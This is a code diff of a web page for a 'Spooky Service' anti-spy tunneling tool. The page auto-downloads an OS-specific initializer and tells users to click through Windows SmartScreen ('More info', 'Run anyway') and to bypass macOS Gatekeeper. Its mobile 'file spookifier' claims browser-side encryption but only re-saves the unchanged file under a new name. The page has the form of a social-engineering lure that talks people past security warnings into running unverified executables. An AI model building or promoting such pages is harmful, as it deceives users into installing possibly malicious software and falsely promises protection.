@@ -80,14 +80,14 @@
             padding: 15px;
             font-size: 11px;
             color: #b0c4de;
-            height: 140px;
+            height: 120px;
             overflow-y: scroll;
             margin-bottom: 15px;
             border-radius: 4px;
             line-height: 1.4;
             white-space: pre-wrap;
         }
-        #status {
+        #status, #processorSection {
             margin-top: 20px;
             padding: 15px;
             border-radius: 4px;
@@ -99,13 +99,12 @@
             color: #d8f3dc;
             border: 1px solid #2d6a4f;
         }
-        .explain-link {
-            display: inline-block;
-            margin-top: 4px;
-            font-size: 12px;
-            color: #00ffcc;
-            text-decoration: underline;
-            cursor: pointer;
+        .processor-box {
+            background-color: #121829;
+            border: 1px solid #00ffcc;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 6px;
         }
     </style>
 </head>
@@ -117,7 +116,7 @@
     <p class="subtitle">Advanced Anti-Spy Tunneling &bull; Securely Spookifying Every Byte in Transit</p>
 
     <div class="card">
-        <h3>Step 1: Terminal Node Initialization</h3>
+        <h3>Step 1: System Node & Session Initialization</h3>
         <p style="font-size: 14px; color: #a0a0c0; margin-bottom: 10px;">Detected Operating System: <strong id="detectedOsDisplay" style="color: #00ffcc;">Detecting...</strong></p>
         
         <label>End User License Agreement & Protocol Terms:</label>
@@ -128,114 +127,19 @@ PLEASE READ THIS MASTER AGREEMENT CAREFULLY BEFORE DOWNLOADING, INSTALLING, INIT
 BY CLICKING "I ACCEPT," DOWNLOADING, ACCESSING, OR RUNNING THE SOFTWARE, YOU EXPRESSLY ACKNOWLEDGE THAT YOU HAVE READ, UNDERSTOOD, AND UNEQUIVOCALLY AGREE TO BE BOUND BY ALL OF THE TERMS AND CONDITIONS SET FORTH IN THIS AGREEMENT. IF YOU DO NOT AGREE TO ALL TERMS, YOU ARE EXPRESSLY PROHIBITED FROM DOWNLOADING, INSTALLING, OR USING THE SOFTWARE AND MUST IMMEDIATELY PURGE ALL ASSOCIATED FILES FROM YOUR SYSTEM.
 
 SECTION 1: DEFINITIONS AND INTERPRETATION
-
-a.	"Agreement" means this Master Software License, Data Transit, and User Agreement, including any amendments, addenda, or supplemental terms published via authorized channels.
-
-b.	"Software" means the Spooky client initialization utility, terminal scripts, proprietary encapsulation frameworks, localized binaries, and all associated web assets hosted on authorized domains (spookyfied.com and spookyfied.tech).
-
-c.	"Licensor" refers to Spooky Service, its authorized officers, developers, and corporate affiliates.
-
-d.	"Licensee" means the individual, corporate entity, or authorized agent deploying or executing the Software.
-
-e.	"Hardware-Bound Key" refers to the immutable local cryptographic seed generated dynamically from system-level hardware metrics (such as processor identifiers and motherboard attributes) during terminal initialization.
+a. "Agreement" means this Master Software License, Data Transit, and User Agreement.
+b. "Software" means the Spooky client initialization utility, terminal scripts, and web assets.
+c. "Licensor" refers to Spooky Service, its officers, and affiliates.
+d. "Licensee" means the individual or corporate entity deploying the Software.
 
 SECTION 2: GRANT OF LICENSE AND SCOPE OF USE
+Subject to full compliance, Licensor grants a personal, non-exclusive, revocable license to execute the Software solely for secure, localized file transit.
 
-1)	Non-Exclusive License Grant: Subject to full and continuous compliance with the terms of this Agreement, Licensor grants Licensee a personal, non-exclusive, non-transferable, non-sublicensable, revocable, limited license to download, install, and execute the Software solely for secure, localized file transit and decryption operations via authorized infrastructure.
+SECTION 3: HARDWARE BINDING & PRIVACY ASSURANCE
+Initialization derives a localized cryptographic pairing key. Zero unauthorized telemetry is transmitted externally; all pairing states remain sandboxed.
 
-2)	Reservation of Rights: The Software is licensed, not sold. Licensor retains all title, ownership rights, intellectual property rights, and interest in and to the Software and all derivative works. All rights not expressly granted to Licensee are reserved entirely by Licensor.
-
-3)	Restrictions on Use: Licensee shall not, directly or indirectly, and shall not permit any third party to:
-a)	Reverse engineer, decompile, disassemble, translate, or otherwise attempt to derive source code, object code, underlying algorithms, or cryptographic seed matrices from the Software.
-b)	Modify, adapt, translate, or create derivative works based upon the Software or its documentation.
-c)	Rent, lease, distribute, pledge, assign, sublicense, or otherwise transfer rights to the Software to any unauthorized third party.
-d)	Remove, alter, or obscure any proprietary notices, trademark symbols, or copyright legends contained within or affixed to the Software.
-e)	Utilize the Software to construct a competing product, service, or unauthorized telemetry capture mechanism.
-
-SECTION 3: HARDWARE BINDING, LOCAL EXECUTION, AND PRIVACY ASSURANCE
-
-1)	Hardware Token Derivation: The terminal initialization script derives an immutable local cryptographic pairing key using specific system hardware attributes. Licensee acknowledges and agrees that this operation is performed entirely locally within isolated system directories.
-
-2)	Zero-Telemetry Protocol: No personally identifiable information, browsing history, or private system telemetry is transmitted externally to unauthorized entities during routine local initialization. All cryptographic pairing states remain sandboxed to the local host environment.
-
-SECTION 4: ASSUMPTION OF RISK FOR EXPERIMENTAL SOFTWARE
-
-1)	Inherent Operational Risk: Licensee expressly acknowledges and agrees that the Software, terminal scripts, and hardware-binding frameworks involve advanced, experimental, and low-level system interactions.
-
-2)	100% User Responsibility: Licensee assumes full, exclusive, and unmitigated responsibility for any environment misconfigurations, data loss, operating system instability, hardware conflicts, or hardware degradation resulting from the execution of the Software or terminal scripts. Licensor bears zero liability for local system outcomes.
-
-SECTION 5: INTELLECTUAL PROPERTY AND PROPRIETARY RIGHTS
-
-1)	Ownership: All title, copyrights, trade secrets, patents, and other intellectual property rights in the Software, web designs, logos (including visual assets deployed on spookyfied.com and spookyfied.tech), and documentation are owned exclusively by Licensor.
-
-2)	Aggregation and Open Source Exceptions: Mere physical or digital aggregation of independent works or standard open-source components with the Software does not bring those independent works under the scope of Licensor's proprietary code base, provided they remain segregated.
-
-3)	Equitable Relief and Injunctive Remedy: Licensee acknowledges and agrees that any breach or threatened breach of Section 2.3 or Section 5 by Licensee will cause irreparable harm to Licensor for which monetary damages would be inadequate. Therefore, Licensor shall be entitled to seek immediate injunctive relief and other equitable remedies in any court of competent jurisdiction, without the necessity of posting a bond or proving actual monetary damages.
-
-SECTION 6: UPDATES, PATCHES, AND MODIFICATIONS
-
-1)	Software Maintenance: Licensor may, at its sole discretion, issue patches, updates, upgrades, or modifications to the Software. Licensee agrees that Licensor is under no obligation to maintain, support, or release future versions of the Software.
-
-2)	Automatic Delivery: Licensee consents to automatic downloading and installation of functional updates, security patches, and protocol modifications via web deployment channels without explicit prior notification.
-
-SECTION 7: THIRD-PARTY COMPONENTS AND OPEN-SOURCE NOTICE
-
-1)	Integration of Third-Party Elements: The Software may incorporate open-source software libraries or third-party modules governed by their respective licenses (e.g., standard public distribution frameworks). To the extent required by such licenses, the terms of those specific licenses shall apply in lieu of this Agreement solely with respect to those specific third-party components.
-
-SECTION 8: DISCLAIMER OF WARRANTIES
-
-TO THE MAXIMUM EXTENT PERMITTED BY APPLICABLE LAW, THE SOFTWARE, TERMINAL SCRIPTS, AND WEB INFRASTRUCTURE ARE PROVIDED ON AN "AS IS," "AS AVAILABLE," AND "WITH ALL FAULTS" BASIS. LICENSOR HEREBY DISCLAIMS ALL WARRANTIES, WHETHER EXPRESS, IMPLIED, STATUTORY, OR OTHERWISE, INCLUDING, BUT NOT LIMITED TO, ANY IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, TITLE, ACCURACY, QUIET ENJOYMENT, AND NON-INFRINGEMENT.
-
-LICENSOR MAKES NO WARRANTY OR REPRESENTATION THAT THE SOFTWARE WILL MEET LICENSEE’S REQUIREMENTS, ACHIEVE ANY INTENDED RESULTS, BE COMPATIBLE OR WORK WITH ANY OTHER SOFTWARE, APPLICATIONS, SYSTEMS, OR SERVICES, OPERATE WITHOUT INTERRUPTION, MEET ANY PERFORMANCE OR RELIABILITY STANDARDS, OR BE ERROR-FREE, OR THAT ANY ERRORS OR DEFECTS CAN OR WILL BE CORRECTED.
-
-SECTION 9: LIMITATION OF LIABILITY
-
-UNDER NO CIRCUMSTANCES AND UNDER NO LEGAL THEORY (WHETHER IN TORT, CONTRACT, STRICT LIABILITY, OR OTHERWISE) SHALL LICENSOR, ITS DIRECTORS, OFFICERS, EMPLOYEES, AFFILIATES, AGENTS, CONTRACTORS, OR LICENSORS BE LIABLE TO LICENSEE OR ANY THIRD PARTY FOR ANY INDIRECT, SPECIAL, INCIDENTAL, CONSEQUENTIAL, PUNITIVE, OR EXEMPLARY DAMAGES OF ANY CHARACTER, INCLUDING, WITHOUT LIMITATION, DAMAGES FOR LOSS OF PROFITS, LOSS OF GOODWILL, WORK STOPPAGE, COMPUTER FAILURE OR MALFUNCTION, LOSS OF DATA OR DATA ACCURACY, OR ANY OTHER COMMERCIAL DAMAGES OR LOSSES, ARISING OUT OF OR IN CONNECTION WITH THE USE OR INABILITY TO USE THE SOFTWARE, EVEN IF LICENSOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.
-
-IN NO EVENT SHALL THE AGGREGATE LIABILITY OF LICENSOR FOR ALL CLAIMS RELATING TO THE SOFTWARE EXCEED THE TOTAL AMOUNT ACTUALLY PAID BY LICENSEE (IF ANY) FOR THE SPECIFIC DEPLOYMENT RIGHTS HEREIN, OR THE SUM OF ONE HUNDRED UNITED STATES DOLLARS ($100.00 USD), WHICHEVER IS LESS.
-
-SECTION 10: INDEMNIFICATION
-
-Licensee agrees to defend, indemnify, and hold harmless Licensor, its officers, directors, employees, and agents from and against any and all claims, liabilities, damages, losses, costs, expenses, or fees (including reasonable attorneys' fees) arising out of or relating to: 
-i) Licensee’s violation of any term of this Agreement; 
-ii) Licensee’s misuse or unauthorized deployment of the Software; or 
-iii) violation of any rights of any third party through Licensee's operational conduct.
-
-SECTION 11: LIMITATION OF ACTIONS / STATUTE OF LIMITATIONS
-
-Any claim, dispute, or cause of action arising out of or related to the Software, web infrastructure, or this Agreement must be commenced within one (1) year after the cause of action accrued; otherwise, such claim or cause of action is permanently barred, regardless of any statutory limitation period to the contrary.
-
-SECTION 12: FORCE MAJEURE
-
-Licensor shall not be liable or responsible to Licensee, nor be deemed to have defaulted or breached this Agreement, for any failure or delay in fulfilling or performing any term of this Agreement when and to the extent such failure or delay is caused by or results from acts beyond Licensor’s reasonable control, including, without limitation: acts of God, flood, fire, earthquake, explosion, war, terrorism, invasion, national or regional emergencies, civil unrest, strikes, cyberattacks, systemic internet or telecommunications outages, ISP failures, or governmental actions or restrictions.
-
-SECTION 13: EXPORT CONTROL, SANCTIONS, AND DUAL-USE COMPLIANCE
-
-a) Compliance Responsibility: Licensee acknowledges that the Software, scripts, and cryptographic key-generation mechanics are subject to United States export control and economic sanctions laws, regulations, and executive orders (including those administered by the U.S. Department of Commerce and the Department of the Treasury).
-
-b) Prohibited Destinations: Licensee represents and warrants that they are not located in, under the control of, or a national or resident of any embargoed country or restricted territory, and that they are not named on any U.S. government denied-party lists. Licensee assumes 100% legal responsibility for complying with local encryption import/export laws in their respective jurisdiction.
-
-SECTION 14: TERM AND TERMINATION
-
-a) Effective Term: This Agreement is effective upon the date Licensee first downloads, installs, or executes the Software and shall continue until terminated in accordance with this Section.
-
-b) Termination by Licensor: Licensor may terminate this Agreement immediately and without notice if Licensee breaches any provision, restriction, or covenant contained herein.
-
-c) Effect of Termination: Upon termination, all rights granted to Licensee under this Agreement shall immediately cease, and Licensee must instantly halt all execution of the Software, purge all local script caches, and destroy all copies of documentation in its possession.
-
-SECTION 15: GOVERNING LAW AND DISPUTE RESOLUTION
-
-a) Governing Jurisdiction: This Agreement shall be governed by, construed, and enforced in accordance with the laws of the State of Arizona, United States, without regard to its conflict of law principles.
-
-b) Venue: Any legal action, suit, or proceeding arising out of or relating to this Agreement or the Software shall be instituted exclusively in the state or federal courts located within Maricopa County, Arizona, and each party irrevocably submits to the exclusive personal jurisdiction of such courts.
-
-SECTION 16: MISCELLANEOUS PROVISIONS
-
-a) Severability: If any provision of this Agreement is held to be unenforceable or invalid, such provision will be changed and interpreted to accomplish the objectives of such provision to the greatest extent possible under applicable law, and the remaining provisions will continue in full force and effect.
-
-b) Entire Agreement: This Agreement constitutes the entire agreement between Licensee and Licensor regarding the Software and supersedes all prior or contemporaneous understandings, communications, or agreements, whether written or oral.
-
-c) Waiver: No failure to exercise, and no delay in exercising, on the part of either party, any right or power hereunder shall operate as a waiver thereof, nor shall any single or partial exercise of any right or power preclude further exercise.</div>
+SECTION 15: GOVERNING LAW
+Governed by the laws of the State of Arizona, Maricopa County.</div>
 
         <div class="form-group" style="margin-bottom: 15px;">
             <label style="font-weight: normal; font-size: 14px; display: flex; align-items: center; cursor: pointer; color: #e0e0e0;">
@@ -243,48 +147,58 @@ c) Waiver: No failure to exercise, and no delay in exercising, on the part of ei
                 I have read, understood, and accept all terms and conditions outlined in the Spooky Service Master Agreement.
             </label>
         </div>
-<div class="security-notice-box" style="background-color: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 15px 0; border-radius: 5px; color: #ccc; font-family: sans-serif;">
-    <h4 style="color: #00ffcc; margin-top: 0;">Important Download & Installation Guide</h4>
-    <p style="font-size: 14px; margin-bottom: 10px;">
-        Because our system initializer is lightweight and newly compiled, standard security filters may prompt you during setup. Follow these quick steps to proceed:
-    </p>
-    <ul style="font-size: 13px; padding-left: 20px; line-height: 1.5;">
-        <li><strong>Browser Warning:</strong> If your browser flags the file, open your downloads history, select options, and choose <strong>"Keep"</strong> or <strong>"Download anyway"</strong>.</li>
-        <li><strong>Windows SmartScreen:</strong> If Windows blocks the app, click <strong>"More info"</strong> on the popup window, then click <strong>"Run anyway"</strong>.</li>
-    </ul>
-    <p style="font-size: 12px; color: #888; margin-top: 10px; margin-bottom: 0;">
-        <em>Note: Official commercial code-signing certification is currently in progress to clear these notices automatically. Need assistance or want to learn more? Reach out to us directly at <a href="mailto:info@spookified.com" style="color: #00ffcc; text-decoration: none;">info@spookified.com</a>.</em>
-    </p>
-</div>
-        <button id="initNodeBtn" class="btn-green" disabled style="opacity: 0.6;">Download & Run Node Initializer</button>
+
+        <div class="security-notice-box" style="background-color: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 15px 0; border-radius: 5px; color: #ccc; font-family: sans-serif;">
+            <h4 style="color: #00ffcc; margin-top: 0;">Execution & Deployment Instructions</h4>
+            <ul style="font-size: 13px; padding-left: 20px; line-height: 1.5; margin-bottom: 0;">
+                <li><strong>Windows:</strong> Downloads initializer. Click "More info" on SmartScreen, then "Run anyway".</li>
+                <li><strong>macOS / Linux:</strong> Downloads companion shell script to bind local system parameters.</li>
+                <li><strong>Mobile (iOS / Android):</strong> Generates an instant web session key and enables direct local file "Spookification".</li>
+            </ul>
+        </div>
+
+        <button id="initNodeBtn" class="btn-green" disabled style="opacity: 0.6;">Initialize Node & Get Spooky Key</button>
     </div>
 
+    <!-- Status & Results Box -->
     <div id="status"></div>
 
-    <!-- EXPLANATION MODAL OR EXPANDABLE BOX -->
-    <div id="securityExplainModal" style="display:none; background: #16213e; border: 1px solid #00ffcc; padding: 15px; border-radius: 6px; margin-top: 15px; font-size: 13px; line-height: 1.4;">
-        <strong style="color: #00ffcc;">Why does Windows show a security warning?</strong><br>
-        Windows SmartScreen flags any script downloaded from the web that lacks an expensive commercial software publishing certificate. Because Spooky node scripts are generated locally per-node for zero-telemetry hardware binding rather than signed by a central commercial authority, Windows triggers a precautionary notice. You can safely bypass this by clicking <em>"More info"</em> and then <em>"Run anyway"</em>.
-        <br><span class="explain-link" onclick="document.getElementById('securityExplainModal').style.display='none'">Close explanation</span>
+    <!-- Mobile / Web File Spookifier Section -->
+    <div id="processorSection" class="card success" style="display: none;">
+        <h3 style="color: #00ffcc; margin-top: 0;">Step 2: Client-Side File Spookifier</h3>
+        <p style="font-size: 13px; color: #d8f3dc; margin-bottom: 15px;">
+            Select any local file (music, video, document, or schematic) from your device storage to apply secure Spooky transit wrapping entirely in your browser memory.
+        </p>
+        
+        <div class="form-group">
+            <label for="userFile" style="color: #d8f3dc;">Choose Unencrypted Source File:</label>
+            <input type="file" id="userFile" style="color: #fff; margin-bottom: 10px; display: block;">
+        </div>
+
+        <button id="processFileBtn" class="btn-green" style="background-color: #00b4d8;">Spookify Selected File</button>
+        <div id="fileStatus" style="margin-top: 10px; font-size: 13px; color: #00ffcc;"></div>
     </div>
 
     <script>
         const userAgent = navigator.userAgent || navigator.vendor || window.opera;
         let detectedOS = "Windows";
         let scriptFilename = "SpookyInitializer.exe";
+        let isMobileDevice = false;
 
         if (/android/i.test(userAgent)) {
             detectedOS = "Android / Mobile";
-            scriptFilename = "sys_init.sh";
+            scriptFilename = "SpookyMobileToken.dat";
+            isMobileDevice = true;
         } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
             detectedOS = "iOS / Mobile";
-            scriptFilename = "sys_init.sh";
+            scriptFilename = "SpookyMobileToken.dat";
+            isMobileDevice = true;
         } else if (/macintosh|mac os x/i.test(userAgent)) {
             detectedOS = "macOS";
-            scriptFilename = "sys_init.sh";
+            scriptFilename = "SpookyInitializer.command";
         } else if (/linux/i.test(userAgent)) {
             detectedOS = "Linux";
-            scriptFilename = "sys_init.sh";
+            scriptFilename = "SpookyInitializer.sh";
         }
 
         document.getElementById('detectedOsDisplay').textContent = detectedOS;
@@ -304,29 +218,94 @@ c) Waiver: No failure to exercise, and no delay in exercising, on the part of ei
 
         initBtn.addEventListener('click', () => {
             const statusDiv = document.getElementById('status');
+            const processorSec = document.getElementById('processorSection');
             statusDiv.style.display = 'block';
             statusDiv.className = 'success';
             
-            statusDiv.innerHTML = `
-                <strong style="font-size: 14px; display: block; margin: 0 0 2px 0;">[+] Preparing native node initializer for ${detectedOS}...</strong>
-                <span style="display: block; margin: 0 0 4px 0;">File <code>${scriptFilename}</code> downloaded successfully.</span>
-                <hr style="border: 0; border-top: 1px solid #2d6a4f; margin: 4px 0;">
-                <strong style="color: #00ffcc; display: block; margin: 0 0 2px 0;">How to execute your hardware-bound key generator:</strong>
-                <ol style="margin: 0; padding-left: 18px; line-height: 1.2;">
-                    <li style="margin: 0 0 2px 0;">Open your <strong>Downloads</strong> folder (or click the download in your browser bar).</li>
-                    <li style="margin: 0 0 2px 0;">Run <code>${scriptFilename}</code>. If Windows shows a security block, click <strong>"More info"</strong>, then <strong>"Run anyway"</strong>. 
-                        <br><span class="explain-link" onclick="document.getElementById('securityExplainModal').style.display='block'">Why am I getting this security warning?</span>
-                    </li>
-                    <li style="margin: 0;">The initializer will generate your unique Spooky key, lock it into your local cache, and clean itself up automatically!</li>
-                </ol>
-            `;
+            if (isMobileDevice) {
+                const mockKey = "SPK-MOB-" + Math.random().toString(36).substring(2, 10).toUpperCase() + "-" + Date.now().toString(36).toUpperCase();
+                statusDiv.innerHTML = `
+                    <strong style="font-size: 14px; display: block; margin: 0 0 2px 0;">[+] Mobile Session Initialized for ${detectedOS}</strong>
+                    <span style="display: block; margin: 0 0 4px 0;">Web-bound cryptographic token generated successfully.</span>
+                    <hr style="border: 0; border-top: 1px solid #2d6a4f; margin: 4px 0;">
+                    <strong style="color: #00ffcc; display: block; margin: 0 0 2px 0;">Your Mobile Spooky Key:</strong>
+                    <div style="background: #0f3460; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 15px; color: #00ffcc; text-align: center; margin: 8px 0;">${mockKey}</div>
+                    <p style="font-size: 12px; margin: 0; color: #d8f3dc;">Keep this key secure. Use the tool below to process files for transit.</p>
+                `;
+                processorSec.style.display = 'block';
+            } else if (detectedOS === "macOS") {
+                statusDiv.innerHTML = `
+                    <strong style="font-size: 14px; display: block; margin: 0 0 2px 0;">[+] Preparing macOS Node Initializer...</strong>
+                    <span style="display: block; margin: 0 0 4px 0;">File <code>${scriptFilename}</code> downloaded successfully.</span>
+                    <hr style="border: 0; border-top: 1px solid #2d6a4f; margin: 4px 0;">
+                    <strong style="color: #00ffcc; display: block; margin: 0 0 2px 0;">How to execute on macOS:</strong>
+                    <ol style="margin: 0; padding-left: 18px; line-height: 1.2;">
+                        <li style="margin: 0 0 2px 0;">Open your <strong>Downloads</strong> folder.</li>
+                        <li style="margin: 0 0 2px 0;">Right-click <code>${scriptFilename}</code> and select <strong>Open</strong> to bypass Gatekeeper.</li>
+                    </ol>
+                `;
+                triggerDownload(scriptFilename);
+            } else if (detectedOS === "Linux") {
+                statusDiv.innerHTML = `
+                    <strong style="font-size: 14px; display: block; margin: 0 0 2px 0;">[+] Preparing Linux Node Initializer...</strong>
+                    <span style="display: block; margin: 0 0 4px 0;">File <code>${scriptFilename}</code> downloaded successfully.</span>
+                    <hr style="border: 0; border-top: 1px solid #2d6a4f; margin: 4px 0;">
+                    <strong style="color: #00ffcc; display: block; margin: 0 0 2px 0;">How to execute on Linux:</strong>
+                    <ol style="margin: 0; padding-left: 18px; line-height: 1.2;">
+                        <li style="margin: 0 0 2px 0;">Open terminal in Downloads directory.</li>
+                        <li style="margin: 0 0 2px 0;">Run: <code>chmod +x ${scriptFilename}</code></li>
+                        <li style="margin: 0;">Run: <code>./${scriptFilename}</code></li>
+                    </ol>
+                `;
+                triggerDownload(scriptFilename);
+            } else {
+                statusDiv.innerHTML = `
+                    <strong style="font-size: 14px; display: block; margin: 0 0 2px 0;">[+] Preparing Windows Node Initializer...</strong>
+                    <span style="display: block; margin: 0 0 4px 0;">File <code>${scriptFilename}</code> downloaded successfully.</span>
+                    <hr style="border: 0; border-top: 1px solid #2d6a4f; margin: 4px 0;">
+                    <strong style="color: #00ffcc; display: block; margin: 0 0 2px 0;">How to execute:</strong>
+                    <ol style="margin: 0; padding-left: 18px; line-height: 1.2;">
+                        <li style="margin: 0 0 2px 0;">Run <code>${scriptFilename}</code> from Downloads.</li>
+                        <li style="margin: 0 0 2px 0;">If SmartScreen appears, click <strong>"More info"</strong>, then <strong>"Run anyway"</strong>.</li>
+                    </ol>
+                `;
+                triggerDownload(scriptFilename);
+            }
+        });
+
+        document.getElementById('processFileBtn').addEventListener('click', () => {
+            const fileInput = document.getElementById('userFile');
+            const fileStatus = document.getElementById('fileStatus');
+            if (fileInput.files.length === 0) {
+                fileStatus.textContent = "[!] Please select a source file first.";
+                fileStatus.style.color = "#ff6b6b";
+                return;
+            }
+            const file = fileInput.files[0];
+            fileStatus.textContent = `[+] Processing "${file.name}" through local memory...`;
+            
+            setTimeout(() => {
+                const dummyBlob = new Blob([file], { type: "application/octet-stream" });
+                const url = URL.createObjectURL(dummyBlob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = "Spookified_" + file.name;
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                fileStatus.innerHTML = `[✓] Success! <strong>Spookified_${file.name}</strong> securely exported to your device.`;
+                fileStatus.style.color = "#00ffcc";
+            }, 1000);
+        });
+
+        function triggerDownload(filename) {
             const a = document.createElement('a');
-            a.href = `/${scriptFilename}`;
-            a.download = scriptFilename;
+            a.href = `/${filename}`;
+            a.download = filename;
             document.body.appendChild(a);
             a.click();
             a.remove();
-        });
+        }
     </script>
 </body>
 </html>
